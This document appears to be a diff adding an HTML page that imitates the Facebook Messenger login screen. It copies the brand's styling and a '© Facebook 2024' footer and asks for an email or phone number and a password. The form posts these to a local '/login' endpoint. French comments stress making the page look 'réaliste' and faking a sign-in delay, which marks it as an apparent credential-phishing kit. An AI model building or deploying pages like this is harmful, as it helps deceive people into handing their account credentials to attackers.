@@ -1,0 +1,289 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Messenger - Connexion</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+        }
+        
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        
+        .logo {
+            margin-bottom: 24px;
+        }
+        
+        .logo svg {
+            width: 48px;
+            height: 48px;
+        }
+        
+        .title {
+            color: #1c1e21;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            line-height: 1.2;
+        }
+        
+        .subtitle {
+            color: #65676b;
+            font-size: 14px;
+            margin-bottom: 32px;
+            line-height: 1.4;
+        }
+        
+        .signin-text {
+            color: #1c1e21;
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 24px;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            font-family: inherit;
+            background: #ffffff;
+            transition: border-color 0.2s ease;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+        
+        .form-group input::placeholder {
+            color: #65676b;
+        }
+        
+        .continue-btn {
+            width: 100%;
+            background: #1877f2;
+            color: white;
+            border: none;
+            padding: 12px 16px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            margin-bottom: 16px;
+        }
+        
+        .continue-btn:hover {
+            background: #166fe5;
+        }
+        
+        .continue-btn:active {
+            background: #1464d0;
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+        
+        .checkbox-group input[type="checkbox"] {
+            margin-right: 8px;
+            width: 16px;
+            height: 16px;
+            accent-color: #1877f2;
+        }
+        
+        .checkbox-group label {
+            color: #1c1e21;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .footer {
+            border-top: 1px solid #dddfe2;
+            padding-top: 16px;
+            margin-top: 24px;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px;
+            font-size: 12px;
+            color: #65676b;
+        }
+        
+        .footer-links a {
+            color: #65676b;
+            text-decoration: none;
+            padding: 0 8px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer-links .separator {
+            color: #dddfe2;
+        }
+        
+        .copyright {
+            margin-top: 16px;
+            font-size: 12px;
+            color: #65676b;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px 16px;
+                margin: 0;
+                border-radius: 0;
+            }
+            
+            .title {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 36 36" fill="#1877f2" height="48" width="48">
+                <path d="M18 0C8.059 0 0 8.059 0 18s8.059 18 18 18 18-8.059 18-18S27.941 0 18 0zm0 2c8.837 0 16 7.163 16 16s-7.163 16-16 16S2 26.837 2 18 9.163 2 18 2z"/>
+                <path d="M18 6c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12S24.627 6 18 6zm0 2c5.514 0 10 4.486 10 10s-4.486 10-10 10S8 23.514 8 18 12.486 8 18 8z" fill="#ffffff"/>
+                <path d="M18 10c-4.418 0-8 3.582-8 8s3.582 8 8 8 8-3.582 8-8-3.582-8-8-8zm0 2c3.314 0 6 2.686 6 6s-2.686 6-6 6-6-2.686-6-6 2.686-6 6-6z" fill="#ffffff"/>
+                <path d="M18 14c-2.209 0-4 1.791-4 4s1.791 4 4 4 4-1.791 4-4-1.791-4-4-4z" fill="#ffffff"/>
+            </svg>
+        </div>
+        
+        <h1 class="title">Messenger</h1>
+        <p class="subtitle">Instantly connect with people in your life.</p>
+        
+        <p class="signin-text">Sign in with Facebook to get started.</p>
+        
+        <form method="POST" action="/login" id="loginForm">
+            <div class="form-group">
+                <input type="text" id="email" name="email" placeholder="Email address or phone number" required autocomplete="email">
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
+            </div>
+            
+            <button type="submit" class="continue-btn" id="loginBtn">
+                Continue
+            </button>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="keep-signed" name="keep_signed">
+                <label for="keep-signed">Keep me signed in</label>
+            </div>
+        </form>
+        
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Not on Facebook?</a>
+                <span class="separator">|</span>
+                <a href="#">Forgotten password</a>
+                <span class="separator">|</span>
+                <a href="#">Data Policy</a>
+                <span class="separator">|</span>
+                <a href="#">Terms</a>
+                <span class="separator">|</span>
+                <a href="#">Cookies Policy</a>
+            </div>
+            <div class="copyright">
+                © Facebook 2024
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Animation de chargement réaliste
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const btn = document.getElementById('loginBtn');
+            btn.innerHTML = 'Signing in...';
+            btn.style.opacity = '0.7';
+            btn.disabled = true;
+            
+            // Simuler un délai de connexion
+            setTimeout(() => {
+                btn.innerHTML = 'Continue';
+                btn.style.opacity = '1';
+                btn.disabled = false;
+            }, 2000);
+        });
+        
+        // Effet de focus réaliste
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.borderColor = '#1877f2';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.style.borderColor = '#dddfe2';
+            });
+        });
+        
+        // Validation en temps réel
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const continueBtn = document.getElementById('loginBtn');
+        
+        function validateForm() {
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            if (email && password) {
+                continueBtn.style.opacity = '1';
+                continueBtn.disabled = false;
+            } else {
+                continueBtn.style.opacity = '0.6';
+                continueBtn.disabled = true;
+            }
+        }
+        
+        emailInput.addEventListener('input', validateForm);
+        passwordInput.addEventListener('input', validateForm);
+        
+        // Initialisation
+        validateForm();
+    </script>
+</body>
+</html>
+        
